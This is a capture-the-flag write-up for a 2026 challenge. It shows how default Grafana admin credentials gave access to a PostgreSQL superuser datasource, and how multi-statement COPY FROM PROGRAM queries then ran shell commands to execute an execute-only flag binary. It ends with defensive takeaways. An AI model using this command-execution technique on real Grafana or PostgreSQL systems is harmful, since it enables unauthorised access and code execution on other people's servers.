---
layout: post
title: "SHC 2026: Grafasaurus - Grafana + PostgreSQL COPY FROM PROGRAM RCE"
date: 2026-05-08
tags: [web]
---

## Challenge Overview

**Target:** Grafana 12.4.0 + PostgreSQL 18
**Flag location:** `/flag` — with `--x--x--x` permissions (execute-only, no read)

## Step 1: Identify the Datasource

```
GET /api/datasources
Credentials: admin:admin (default)
```

Found: PostgreSQL datasource (id: 1), connecting to `postgres:5432` as `postgres` (superuser).

## Step 2: Confirm Flag Exists

`pg_read_file('/flag')` — permission denied.
`pg_stat_file('/flag')` — file exists, 706,568 bytes. Path confirmed.

## Step 3: Enumerate the Database

Found dinosaur-themed tables: `dinosaurs`, `clades`, `eras`, `fossil_statistics`.
Also a `pg_temp_0.temp_flag` — empty (temp tables are session-scoped).

## Step 4: COPY FROM PROGRAM (RCE)

Despite `readOnly: true` on the datasource, the Grafana API accepted multi-statement queries. Used `COPY ... FROM PROGRAM` to execute shell commands as the PostgreSQL superuser:

```sql
DROP TABLE IF EXISTS g_out;
CREATE TABLE g_out(t text);
COPY g_out FROM PROGRAM 'ls -la /flag';
SELECT * FROM g_out;
```

Result:

```
---x--x--x. 1 root root 706568 Mar 27 12:04 /flag
```

Execute-only. No read. The twist.

## Step 5: Execute /flag Directly

Since everyone has execute permission, ran it as a program:

```sql
DROP TABLE IF EXISTS g_out;
CREATE TABLE g_out(t text);
COPY g_out FROM PROGRAM '/flag';
SELECT * FROM g_out;
```

The binary ran, printed the flag to stdout, which was captured into the table.

**Flag:** `dach2026{Gr4f4na_c0mb1n3d_w1th_d1n0s4ur_d4ta}`

## Key Takeaways

- Never expose a PostgreSQL superuser through Grafana datasources.
- `COPY FROM PROGRAM` gives arbitrary shell execution to any superuser.
- `--x--x--x` blocks all reads but still allows execution — the intended twist.
- Always rotate default credentials (`admin:admin`).
